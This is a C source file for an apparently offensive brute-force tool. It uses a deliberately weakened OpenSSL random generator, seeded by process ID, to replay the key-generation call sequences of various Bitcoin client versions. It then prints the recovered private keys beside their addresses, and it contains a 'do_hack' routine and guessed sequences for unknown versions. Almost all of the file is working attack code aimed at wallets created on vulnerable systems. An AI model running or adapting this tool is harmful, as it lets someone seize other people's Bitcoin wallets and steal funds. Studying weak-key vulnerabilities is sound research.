#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/ec.h>
#include <openssl/rand.h>
#include <openssl/pem.h>
#include <openssl/ripemd.h>

#define ECCTYPE    "secp256k1"


# define DEBUGF(a...)	do { \
	fprintf(stderr, "%s:%d ", __FILE__, __LINE__); \
	fprintf(stderr, a); \
	fflush(stderr); \
} while (0)

# define ERREXIT(a...)	do { \
	fprintf(stderr, "ERREXIT %s:%d ", __FILE__, __LINE__); \
	fprintf(stderr, a); \
	fflush(stderr); \
	exit(-1); \
} while (0)

# define HEXDUMP(a, len)	do { \
	int n = 0; \
	fprintf(stderr, "%s:%d HEX ", __FILE__, __LINE__); \
	while (n < len) fprintf(stderr, "%2.2x", ((unsigned char *)a)[n++]); \
	fprintf(stderr, "\n"); \
} while (0)

static EC_KEY	 	*myecc  = NULL;
static const char	b58digits_ordered[] = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

#define VERSION			"0.1.2"
#define FL_SKIP_SELFCHECK	(0x01)
struct _opt
{
	pid_t pid_start;
	pid_t pid_end;
	int n_keys;
	int flags;
	int prog;
	int arch;	/* 32 or 64 */
	char *arch_str;	/* le32 or le64 */
};
struct _opt gopt;

typedef struct _prog_t
{
	char *reserved;	
	char *ver;	// bitcoin software version
	int setup[6];	// Calls to RAND_* funcitons before key gen
	int gen[4];	// Key Gen...
} prog_t;

/*
 * Programm Code:
 *  0 	= END of list
 * -1	= Call to ec-key-gen
 * -2	= Call to RAND_bytes(32);
 * -3	= Call to RAND_add(8);
 * >0	= Call n-times to RAND_bytes(8)
 */
/* Same behavior/execution-path on le32 or le64 */
prog_t progs[] = {
{"", "0.3.24",		{-3, -3, 0, 0, 0, 0},		{-3, -1, 0, 0}},
{"", "0.8.6-d", 	{-2, -3, -3, 0, 0, 0}, 		{-3, -1, 0, 0}},
{"", "0.8.6-qt", 	{-3, -2, -3, 0, 0, 0}, 		{-3, -1, 0, 0}},
{"", "0.9.1-d", 	{1800, -2, -3, -3, 0, 0}, 	{-1, 0, 0, 0}},
{"", "0.9.4-d", 	{-2, 1800, -3, -3, 0, 0}, 	{-1, 0, 0, 0}},
{"", "unknownA", 	{0, 0, 0, 0, 0, 0}, 		{-1, 0, 0, 0}},
{"", "unknownB", 	{0, 0, 0, 0, 0, 0}, 		{-3, -1, 0, 0}},
{"", "unknownC", 	{-3, 0, 0, 0, 0, 0}, 		{-1, 0 , 0, 0}},
{"", "unknownD", 	{-3, -3, 0, 0, 0, 0}, 		{-1, 0 , 0, 0}},
{"", "unknownE", 	{-3, 0, 0, 0, 0, 0}, 		{-3, -1, 0, 0}},
{"", "unknownF", 	{-3, -3, -3, 0, 0, 0}, 		{-3, -1, 0, 0}},
{"", "unknownG", 	{-3, -3, -3, -3, 0, 0}, 	{-3, -1, 0, 0}},
{"", "unknownH", 	{-3, -3, -2, 0, 0, 0}, 		{-3, -1, 0, 0}},
{"", "unknownI", 	{-3, -3, -2, -3, 0, 0},		{-3, -1, 0, 0}},
{"", "unknownJ", 	{-3, -3, -2, -3, -3, 0}, 	{-3, -1, 0, 0}},
{"", "unknownK", 	{-3, -2, -2, -3, 0, 0}, 	{-3, -1, 0, 0}}, //#15
/* More random guessig and fuzzing below: */
{"", "unknownA0", 	{-3, -3, -3, -3, 0, 0}, 	{-3, -1, 0, 0}},
{"", "unknownA1", 	{-2, -3, -3, -3, 0, 0}, 	{-3, -1, 0, 0}},
{"", "unknownA2", 	{-3, -2, -3, -3, 0, 0}, 	{-3, -1, 0, 0}},
{"", "unknownA3", 	{-3, -3, -2, -3, 0, 0}, 	{-3, -1, 0, 0}},
{"", "unknownA4", 	{-3, -3, -3, -2, 0, 0}, 	{-3, -1, 0, 0}},

{"", "unknownB0", 	{-3, -3, -3, 0, 0, 0}, 		{-3, -1, 0, 0}},
{"", "unknownB1", 	{-2, -3, -3, 0, 0, 0}, 		{-3, -1, 0, 0}},
{"", "unknownB2", 	{-3, -2, -3, 0, 0, 0}, 		{-3, -1, 0, 0}},
{"", "unknownB3", 	{-3, -3, -2, 0, 0, 0}, 		{-3, -1, 0, 0}},

{"", "unknownC0", 	{-3, -3, 0, 0, 0, 0}, 		{-3, -1, 0, 0}},
{"", "unknownC1", 	{-2, -3, 0, 0, 0, 0}, 		{-3, -1, 0, 0}},
{"", "unknownC2", 	{-3, -2, 0, 0, 0, 0}, 		{-3, -1, 0, 0}},

{"", "unknownD0", 	{-3, -3, -3, -3, -3, 0}, 	{-3, -1, 0, 0}},
{"", "unknownD1", 	{-2, -3, -3, -3, -3, 0}, 	{-3, -1, 0, 0}},
{"", "unknownD2", 	{-3, -2, -3, -3, -3, 0}, 	{-3, -1, 0, 0}},
{"", "unknownD3", 	{-3, -3, -2, -3, -3, 0}, 	{-3, -1, 0, 0}},
{"", "unknownD4", 	{-3, -3, -3, -2, -3, 0}, 	{-3, -1, 0, 0}},
{"", "unknownD5", 	{-3, -3, -3, -3, -2, 0}, 	{-3, -1, 0, 0}},

{"", "unknownE0", 	{-3, 0, 0, 0, 0, 0}, 		{-3, -1 , 0, 0}},

/* More random guessig and fuzzing below: */
{"", "unknownA0x", 	{-3, -3, -3, -3, 0, 0}, 	{-1, 0, 0, 0}},
{"", "unknownA1x", 	{-2, -3, -3, -3, 0, 0}, 	{-1, 0, 0, 0}},
{"", "unknownA2x", 	{-3, -2, -3, -3, 0, 0}, 	{-1, 0, 0, 0}},
{"", "unknownA3x", 	{-3, -3, -2, -3, 0, 0}, 	{-1, 0, 0, 0}},
{"", "unknownA4x", 	{-3, -3, -3, -2, 0, 0}, 	{-1, 0, 0, 0}},

{"", "unknownB0x", 	{-3, -3, -3, 0, 0, 0}, 		{-1, 0, 0, 0}},
{"", "unknownB1x", 	{-2, -3, -3, 0, 0, 0}, 		{-1, 0, 0, 0}},
{"", "unknownB2x", 	{-3, -2, -3, 0, 0, 0}, 		{-1, 0, 0, 0}},
{"", "unknownB3x", 	{-3, -3, -2, 0, 0, 0}, 		{-1, 0, 0, 0}},

{"", "unknownC0x", 	{-3, -3, 0, 0, 0, 0}, 		{-1, 0, 0, 0}},
{"", "unknownC1x", 	{-2, -3, 0, 0, 0, 0}, 		{-1, 0, 0, 0}},
{"", "unknownC2x", 	{-3, -2, 0, 0, 0, 0}, 		{-1, 0, 0, 0}},

{"", "unknownD0x", 	{-3, -3, -3, -3, -3, 0}, 	{-1, 0, 0, 0}},
{"", "unknownD1x", 	{-2, -3, -3, -3, -3, 0}, 	{-1, 0, 0, 0}},
{"", "unknownD2x", 	{-3, -2, -3, -3, -3, 0}, 	{-1, 0, 0, 0}},
{"", "unknownD3x", 	{-3, -3, -2, -3, -3, 0}, 	{-1, 0, 0, 0}},
{"", "unknownD4x", 	{-3, -3, -3, -2, -3, 0}, 	{-1, 0, 0, 0}},
{"", "unknownD5x", 	{-3, -3, -3, -3, -2, 0}, 	{-1, 0, 0, 0}},

{"", "unknownE0x", 	{-3, 0, 0, 0, 0, 0}, 		{-1, 0 , 0, 0}},

};

int
b58enc(unsigned char *b58, size_t *b58sz, unsigned char *src, size_t binsz)
{
	const uint8_t *bin = src;
	int carry;
	size_t i, j, high, zcount = 0;
	size_t size;

	/* Find out the length */
	while (zcount < binsz && !bin[zcount])
		++zcount;

	size = (binsz - zcount) * 138 / 100 + 1;
	uint8_t buf[size];
	memset(buf, 0, size);

	for (i = zcount, high = size - 1; i < binsz; ++i, high = j)
	{
		for (carry = bin[i], j = size - 1; (j > high) || carry; --j)
		{
			carry += 256 * buf[j];
			buf[j] = carry % 58;
			carry /= 58;
			if (!j)
			{
				break;
			}
		}
	}

	for (j = 0; j < size && !buf[j]; ++j);

	if (*b58sz <= zcount + size - j)
	{
		ERREXIT("Wrong size...%zu\n", zcount + size - j + 1);
		*b58sz = zcount + size - j + 1;
		return -1;
	}

	if (zcount)
		memset(b58, '1', zcount);
	for (i = zcount; j < size; ++i, ++j)
	{
		b58[i] = b58digits_ordered[buf[j]];
	}
	b58[i] = '\0';
	*b58sz = i + 1;

	return 0;
}

int
Sha256Hash160(unsigned char *dst, const unsigned char *src, size_t len)
{
	unsigned char hash1[32];
	SHA256(src, len, hash1);
	RIPEMD160(hash1, sizeof(hash1), dst);

	return 0;
}

/*
 * Convert a public key (compressed or uncompressed) to a BTC address.
 */
int
Pub2B58Addr(unsigned char *dstb58, const unsigned char *pbegin, unsigned int nSize)
{
	//HEXDUMP(pbegin, nSize);
	/* Step 1: Hash160 */
	unsigned char dst[1 + 20 + 4];
	/* Hash 160 */
	Sha256Hash160(&dst[1], pbegin, nSize);

	/* Step 2: Add BTC Version */
	dst[0] = 0;	// BTC MainNet is 0. TestNet is 111.

	/* Step 3: Encode Base58 with Check */
	/* Add 4-bytes hash check to the end */

	/* 2x SHA256 */
	unsigned char *ptr = &dst[0];
	unsigned char hash1[32];
	unsigned char hash2[32];
	SHA256(ptr, 1 + 20, hash1);
	SHA256(hash1, sizeof(hash1), hash2);
	memcpy(&ptr[1 + 20], hash2, 4);	// Add 4 last bytes as Checksum

	/* Encode Base58 with Check */
	size_t b58sz = 35;
	b58enc(dstb58, &b58sz, dst, sizeof(dst));
	//DEBUGF("Address: %s\n", dstb58);
	return 0;
}

void

PrintAddress(EC_KEY *myecc, unsigned char *b58upkh, unsigned char *b58cpkh, unsigned char *b58cpsh)
{
        BIGNUM *pky;
        char *pkey;
        pky = (BIGNUM *)EC_KEY_get0_private_key(myecc);
        pkey = BN_bn2hex(pky);
        printf("ECDKEY: %s\n", pkey);
	//printf("%s\n", b58upkh);
	printf("%s\n", b58cpkh);
	//printf("%s\n", b58cpsh);
}
/*
 * Print BTC public Address:
 * An uncompressed public key starts with 04.
 * 
 * - UNCOMPRESSED (bc 0.3.24)
 * - COMPRESSED (bc 0.6+)
 *
 * - P2PKH Pay to Public Key Hash
 * - P2SH  Pay to Script Hash (since 2012-03-15, v0.6.0rc2)
 */
int
CreateAddress(EC_KEY *eckey, unsigned char *b58upkh, unsigned char *b58cpkh, unsigned char *b58cpsh)
{
	unsigned char vchPubKey[65];
	unsigned char *pbegin = NULL;
	unsigned int nSize;

	nSize = i2o_ECPublicKey(eckey, NULL);

	if (nSize != sizeof vchPubKey)
		ERREXIT("Bad size: %d\n", nSize);

	i2o_ECPublicKey(eckey, &pbegin);

	/* Create P2PKH */
	Pub2B58Addr(b58upkh, pbegin, nSize);
	//DEBUGF("P2PKH UAddress: %s\n", b58upkh);

	/* Convert into compressed public key */
	if (pbegin[64] & 1)
		pbegin[0] = 0x03;
	else
		pbegin[0] = 0x02;
	nSize = 33;
	//HEXDUMP(pbegin, nSize);
	Pub2B58Addr(b58cpkh, pbegin, nSize);
	//DEBUGF("P2PKH CAddress: %s\n", b58cpkh);


	/* Create P2SH */
	//DEBUGF("CpubKey: \n");
	//HEXDUMP(pbegin, nSize);
	unsigned char dst[2 + 20];
	Sha256Hash160(&dst[2], pbegin, nSize);

	dst[0] = 0x00;
	dst[1] = 0x14;
	unsigned char cdst[1 + 20 + 4];
	Sha256Hash160(&cdst[1], dst, sizeof (dst));
	cdst[0] = 0x05;	// P2SH header

	/* Append checksum before encoding */
	unsigned char hash1[32];
	unsigned char hash2[32];
	SHA256(cdst, 1 + 20, hash1);
	SHA256(hash1, sizeof(hash1), hash2);
	memcpy(&cdst[1 + 20], hash2, 4);	// Add 4 last bytes as Checksum

	size_t b58sz = 35;

	b58enc(b58cpsh, &b58sz, cdst, sizeof (cdst));
	//DEBUGF("P2SH CAddress: %s\n", b58cpsh);
}

/*
 * Function to check that everything is working ok.....
 *
 * Test against some known test vectors for key gen, broken RNG
 * and btc encoding.
 */
static void
SelfCheck_le32(void)
{
	unsigned char b58up2pkh[35];
	unsigned char b58cp2pkh[35];
	unsigned char b58cp2sh[35];
	char buf[32];

	/* 0.8.6 le32 */
	THC_hitme(0);
	THC_hitme(31337);
	RAND_add(NULL, 8, 1.5);
	RAND_bytes(buf, 32);	// CAddrMan:385 -> RAND_bytes(,32)
	RAND_add(NULL, 8, 1.5);

	RAND_add(NULL, 8, 1.5);
	if (! (EC_KEY_generate_key(myecc)))
		ERREXIT("EC_KEY_generate_key() failed. We fucked up.\n");
	CreateAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);
	if (strcmp(b58cp2pkh, "12x69G2mRProxCiKgZxSrUSWJreJfWDn3b"))
		ERREXIT("SelfCheck failed\n");

	RAND_add(NULL, 8, 1.5);
	if (! (EC_KEY_generate_key(myecc)))
		ERREXIT("EC_KEY_generate_key() failed. We fucked up.\n");
	CreateAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);
	if (strcmp(b58cp2pkh, "1MhpFapcCM4qAxZhNTSzE8jiAQPBWXjBBN"))
		ERREXIT("SelfCheck failed\n");

	/* Create the 101th key in wallet.dat */
	/* PRETTY POINTLESS as the key is very different when
	 * wallet.dat is moved and if wallet.dat was initially generated
	 * on a vuln system than we would catch that with key #1..
	 * Must find out what key is if wallet.dat is temporrily used
	 * on a vuln server.....
	 */
	for (int i = 0; i < 99; i++)
	{
		RAND_add(NULL, 8, 1.5);
		if (! (EC_KEY_generate_key(myecc)))
			ERREXIT("EC_KEY_generate_key() failed. We fucked up.\n");
	}
	CreateAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);
	if (strcmp(b58cp2pkh, "16ewwAwgLzuykY6pLEvHzpS5NPfrcEAvZi"))
		ERREXIT("SelfCheck failed\n");
	if (strcmp(b58cp2sh, "3CPBGXQxdGy9SuWW995NTcJ678ccBVG8bc"))
		ERREXIT("SelfCheck failed\n");

	/* 0.3.24 le32 */
	THC_hitme(0); // clear state
	THC_hitme(31337); // set pid
	RAND_add(NULL, 8, 0);	// CInit -> RandAddSeed
	RAND_add(NULL, 8, 0);	// LoadWallet -> RandAddSeedPerfmon

	RAND_add(NULL, 8, 0);	// LoadWallet -> ... Gen ... -> ...Perfmon
	if (! (EC_KEY_generate_key(myecc)))
		ERREXIT("EC_KEY_generate_key() failed. We fucked up.\n");
	CreateAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);
	if (strcmp(b58up2pkh, "1FkLYqPpfKPAR6EZh2RC6sDwTUA6Axb1XQ"))
		ERREXIT("SelfCheck failed\n");
	if (strcmp(b58cp2pkh, "1Ch2uu8nUDQrtn8ZmNDZNrnkcaKJzn2g4d"))
		ERREXIT("SelfCheck failed\n");
	if (strcmp(b58cp2sh, "32k8SCD2EkJCXgaQarVYEpzREMxSGu6huN"))
		ERREXIT("SelfCheck failed\n");


	RAND_add(NULL, 8, 0);	// ReserverKey.. -> Gen... -> Perfmon
	if (! (EC_KEY_generate_key(myecc)))
		ERREXIT("EC_KEY_generate_key() failed. We fucked up.\n");
	CreateAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);
	if (strcmp(b58up2pkh, "1Q9Fj9JnVbvWBLu21AM3XY7VMCy2DpK8Ex"))
		ERREXIT("SelfCheck failed\n");
	if (strcmp(b58cp2pkh, "14sDGtCYHNqn1rwqXx8ZRBVt19vX4ytib3"))
		ERREXIT("SelfCheck failed\n");
	if (strcmp(b58cp2sh, "31rT4QFXcJHcdipbaNZfT9TmZXGwVHJDy9"))
		ERREXIT("SelfCheck failed\n");

	RAND_add(NULL, 8, 0);	// ReserverKey.. -> Gen... -> Perfmon
	if (! (EC_KEY_generate_key(myecc)))
		ERREXIT("EC_KEY_generate_key() failed. We fucked up.\n");
	CreateAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);
	if (strcmp(b58up2pkh, "1FEQrQ1cvwuH19eT8knqUHjsjAuvtvQFPr"))
		ERREXIT("SelfCheck failed\n");

	/* Create an address that is 1 octet shorter when b58 encoded */
	THC_hitme(0);
	THC_hitme(31342);
	RAND_add(NULL, 8, 0);
	RAND_add(NULL, 8, 0);

	RAND_add(NULL, 8, 0);
	if (! (EC_KEY_generate_key(myecc)))
		ERREXIT("EC_KEY_generate_key() failed. We fucked up.\n");
	CreateAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);
	/* Check against a short BTC address */
	if (strcmp(b58up2pkh, "1f9zW98RUdaNUvpQCiFeWRz6Ns5GGTsyh"))
		ERREXIT("SelfCheck failed\n");

	RAND_add(NULL, 8, 0);	// ReserverKey.. -> Gen... -> Perfmon
	if (! (EC_KEY_generate_key(myecc)))
		ERREXIT("EC_KEY_generate_key() failed. We fucked up.\n");
	CreateAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);
	if (strcmp(b58up2pkh, "1HeXLUdkuC7pbwfuu7XRrhP5gVvzxGsoPL"))
		ERREXIT("SelfCheck failed\n");
}

static void
SelfCheck_le64(void)
{
	unsigned char b58up2pkh[35];
	unsigned char b58cp2pkh[35];
	unsigned char b58cp2sh[35];
	char buf[32];

	/* 0.8.6-qt */
	THC_hitme(0);
	THC_hitme(31337);
	RAND_add(NULL, 8, 1.5);
	RAND_bytes(buf, 32);	
	RAND_add(NULL, 8, 1.5);

	RAND_add(NULL, 8, 1.5);
	if (! (EC_KEY_generate_key(myecc)))
		ERREXIT("EC_KEY_generate_key() failed. We fucked up.\n");
	CreateAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);
	if (strcmp(b58cp2pkh, "1ERT6h4XfbjVsnMW6TdNi2p1DwcWZfSpff"))
		ERREXIT("SelfCheck failed\n");

	/* 0.8.6-d */
	THC_hitme(0);
	THC_hitme(31337);
	RAND_bytes(buf, 32);	
	RAND_add(NULL, 8, 1.5);
	RAND_add(NULL, 8, 1.5);

	RAND_add(NULL, 8, 1.5);
	if (! (EC_KEY_generate_key(myecc)))
		ERREXIT("EC_KEY_generate_key() failed. We fucked up.\n");
	CreateAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);
	if (strcmp(b58up2pkh, "1B3HgvHC7vcppNGWtQRVVDqoTAqb5VVQST"))
		ERREXIT("SelfCheck failed\n");
	if (strcmp(b58cp2pkh, "16nDnwGcQ9EUbveRBKQzzWAWS39tbuHgTJ"))
		ERREXIT("SelfCheck failed\n");
	if (strcmp(b58cp2sh, "3CrxV6FcHXPYjoPxHnq6W7DtXB85yTrDe9"))
		ERREXIT("SelfCheck failed\n");
}

static void
SelfCheck(void)
{

	if (gopt.flags & FL_SKIP_SELFCHECK)
		return;

	if (gopt.arch == 32)
		SelfCheck_le32();
	else if (gopt.arch == 64)
		SelfCheck_le64();
	else
		ERREXIT("Unknown Architecture: %d\n", gopt.arch);
}


static void
init_defaults()
{
	/* Init some defaults */
	gopt.pid_start = 0;
	gopt.pid_end = 32768;
	gopt.n_keys = 300;
	gopt.prog = -1;
	gopt.arch = sizeof (void *) * 8;

	switch (gopt.arch)
	{
	case 32:
		gopt.arch_str = "le32";
		break;
	case 64:
		/* Ignore big endian for now. Dont think many used that */
		gopt.arch_str = "le64";
		break;
	default:
		ERREXIT("Unknown architecture: %d\n", gopt.arch);
	}
}

static void
usage(int argc, char *argv[])
{
	fprintf(stderr, "Version %s (%s)\n"
"Usage:\n"
"-p n-m		Brute Force between PID n-m [default %d-%d]\n"
"-n <num>	Create num number of keys per PID [default: %d]\n"
"-l		Show all supported BTC versions\n"
"-v <prog>	Which BTC version to run (Try -l to find number) [0-%zu]\n"
"-x		Skip Self-Check\n"
"",
	VERSION, gopt.arch_str, gopt.pid_start, gopt.pid_end, gopt.n_keys, sizeof progs / sizeof *progs - 1);


	exit(0);
}

static void
do_getopts(int argc, char *argv[])
{

	int c;
	char *str;
	int i;

	while ((c = getopt(argc, argv, "lxhp:n:v:")) != -1)
	{
		switch (c)
		{
		case 'v':
			gopt.prog = atoi(optarg);
			
			break;
		case 'l':
			for (int i = 0; i < sizeof progs / sizeof *progs; i++)
				printf("#%d\t - %s\n", i, progs[i].ver);
			exit(0);
			break;
		case 'x':
			gopt.flags |= FL_SKIP_SELFCHECK;
			break;
		case 'h':
			usage(argc, argv);
			break;
		case 'n':
			gopt.n_keys = atoi(optarg);
			if (gopt.n_keys <= 0)
				ERREXIT("Wrong parameter: use -n <keys>\n");
			break;
		case 'p':
			str = strchr(optarg, '-');
			if (str == NULL)
				ERREXIT("Wrong parameter: User -p n-m\n");
			gopt.pid_start = atoi(optarg);
			str++;
			gopt.pid_end = atoi(str);
			if ((gopt.pid_start > gopt.pid_end) || (gopt.pid_start <= 0))
				ERREXIT("Wrong parameter: User -p n-m\n");
			break;
		}
	}

	if (gopt.prog < 0)
		ERREXIT("Specify -v <num>\n");
	if (gopt.prog >= sizeof progs / sizeof *progs)
		ERREXIT("-v %d - PROGRAMM DOES NOT EXIST\n", gopt.prog);

	//fprintf(stderr, "Stats: Pid %d - %d\n", gopt.pid_start, gopt.pid_end);
}

static void
prog_run(pid_t pid, prog_t *p)
{
	unsigned char b58up2pkh[35];
	unsigned char b58cp2pkh[35];
	unsigned char b58cp2sh[35];
	char buf[32];


	THC_hitme(0);	// Reset state
	THC_hitme(pid);	// Set PID

	int i = 0;
	for (i = 0; p->setup[i] != 0; i++)
	{
		if (p->setup[i] == -2)
		{
			RAND_bytes(buf, 32);
			continue;
		}
		if (p->setup[i] == -3)
		{
			RAND_add(NULL, 8, 0);
			continue;
		}
		if (p->setup[i] > 0)
		{
			for (int n=0; n < p->setup[i]; n++)
			{
				RAND_bytes(buf, 8);
			}
			continue;
		}
		ERREXIT("Wrong value in setup programm: %d\n", p->setup[i]);
	}

	int n;
	for (n = 0; n < gopt.n_keys; n++)
	{
		for (i = 0; p->gen[i] != 0; i++)
		{
			if (p->gen[i] == -1)
			{
				if (! (EC_KEY_generate_key(myecc)))
					ERREXIT("EC_KEY_generate_key() failed. We fucked up.\n");
				CreateAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);
				PrintAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);
				break;
			}
			if (p->gen[i] == -3)
			{
				RAND_add(NULL, 8, 0);
				continue;
			}
			ERREXIT("Wrong value in gen programm: %d\n", p->gen[i]);
		}
	}
}

void
do_hack(void)
{
	unsigned char b58up2pkh[35];
	unsigned char b58cp2pkh[35];
	unsigned char b58cp2sh[35];
	char buf[32];
	int i;

	THC_hitme(0);
	THC_hitme(31337);

	for (i = 0; i < 1800; i++)
		RAND_bytes(buf, 8);
	RAND_bytes(buf, 32); /* 0.9.1: 0.9.4 has this BEFORE the loop! */
	RAND_add(NULL, 8, 1.5);

	RAND_add(NULL, 8, 1.5);
	if (! (EC_KEY_generate_key(myecc)))
		ERREXIT("EC_KEY_generate_key() failed. We fucked up.\n");
	CreateAddress(myecc, b58up2pkh, b58cp2pkh, b58cp2sh);

	exit(0);
}

/* 10 keys for 1000 pids on 9 programms takes 4 mins
 * Thus full run on 32768 PIDs will take 2h10min
 */

//STOP HERE: Research other BTC version about calls to RAND_* functions
//and especially RAND_bytes() calls...

/*
 * - for each PID generate the 10 first keys.
 * - Brute force through different version:
 *
 */
int
main(int argc, char *argv[])
{
	init_defaults();
	do_getopts(argc, argv);


	OpenSSL_add_all_algorithms();

	myecc = EC_KEY_new_by_curve_name(OBJ_txt2nid(ECCTYPE));
	// if we dont set this then we get a long key with //// in there
//	EC_KEY_set_asn1_flag(myecc, OPENSSL_EC_NAMED_CURVE);
	/* Verify that broken PRNG is used with known Test Vectors */
	SelfCheck();
	//do_hack();

	int i;
	i = gopt.pid_start;
	printf("Stats: Version %s, Arch %s, keys %d, Pid %d-%d\n", progs[gopt.prog].ver, gopt.arch_str, gopt.n_keys, gopt.pid_start, gopt.pid_end);
	for (i = gopt.pid_start; i <= gopt.pid_end; i++)
	{
		prog_run(i, &progs[gopt.prog]);
	}

	exit(0); // CryptoDeepTools
}
